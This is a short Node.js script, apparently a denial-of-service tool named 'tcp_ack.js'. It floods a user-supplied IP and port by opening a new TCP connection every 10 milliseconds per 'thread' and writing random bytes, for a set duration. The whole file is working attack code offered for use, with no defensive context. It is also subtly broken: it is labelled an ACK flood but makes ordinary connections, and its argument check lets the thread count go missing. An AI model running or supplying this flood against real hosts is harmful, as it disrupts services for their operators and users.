const net = require('net');
const crypto = require('crypto');
const { argv } = require('process');

function createTcpAckPacket(size) {
    const packet = Buffer.alloc(size);
    packet.fill(crypto.randomBytes(size));
    return packet;
}

function tcpAckFlood(ip, port, floodtime, size) {
    const endtime = Date.now() + floodtime * 1000;

    const interval = setInterval(() => {
        if (Date.now() >= endtime) {
            clearInterval(interval);
            console.log("stopping...");
            process.exit(0);
        }

        const packet = createTcpAckPacket(size);
        const client = new net.Socket();
        client.setTimeout(2000);

        client.connect(port, ip, () => {
            client.write(packet);
        });

        client.on('error', () => {
            client.destroy();
        });

        client.on('end', () => {
            client.destroy();
        });
    }, 10);
}

if (argv.length < 6) {
    console.log("\nUsage: node tcp_ack.js <IP> <PORT> <DURATION> <SIZE> <THREADS>");
    process.exit(1);
}

const ip = argv[2];
const port = parseInt(argv[3]);
const duration = parseInt(argv[4]);
const size = parseInt(argv[5]);
const threads = parseInt(argv[6]);

console.log(`\nStarting TCP-ACK on ${ip}:${port}`);
console.log(`Duration: ${duration} seconds | Packet Size: ${size} bytes | Threads: ${threads}\n`);

for (let i = 0; i < threads; i++) {
    tcpAckFlood(ip, port, duration, size);
}
